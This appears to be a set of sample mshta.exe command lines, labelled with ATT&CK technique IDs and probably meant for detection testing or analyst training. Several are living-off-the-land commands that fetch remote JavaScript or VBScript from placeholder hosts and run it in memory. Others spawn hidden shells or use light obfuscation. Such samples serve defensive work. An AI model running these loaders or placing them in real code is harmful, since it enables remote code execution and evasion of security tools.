### T1059.007 — JavaScript (fileless, network loader style)
```scss
mshta.exe "javascript:var r=new ActiveXObject('MSXML2.XMLHTTP');r.open('GET','https://static-example[.]net/assets/app.js',0);r.send();if(r.status==200){new Function(r.responseText)();}"
```

### T1059.005 — Visual Basic (inline VBScript)
```scss
mshta.exe "vbscript:Execute(CreateObject(""WScript.Shell"").Run(""cmd.exe /c whoami"",0))"
```

### T1059.003 — Windows Command Shell (LOLBin chain)
```scss
cmd.exe /c mshta.exe "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe /c dir C:\\Users',0)"
```

### T1059.001 — PowerShell (launched indirectly)
```scss
mshta.exe "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Run('powershell -nop -c Get-Process',0)"
```

### T1059.007 + T1027 — JavaScript with light obfuscation
```scss
mshta.exe "javascript:var p='po'+'wer'+'shell';var w=new ActiveXObject('WScript.Shell');w.Run(p+' -c echo test',0)"
```

### T1059.005 — VBScript + ActiveX download pattern (classic)
```scss
mshta.exe "vbscript:Set x=CreateObject(""MSXML2.XMLHTTP""):x.Open ""GET"",""https://api-example[.]org/data"",False:x.Send"
```

### Mixed-signal "analyst headache" sample (very realistic)
```scss
powershell.exe -c mshta.exe "javascript:try{var a=new ActiveXObject('MSXML2.XMLHTTP');a.open('GET','https://cdn-example[.]com/r',0);a.send();if(a.status==200){Function(a.responseText)();}}catch(e){}"
```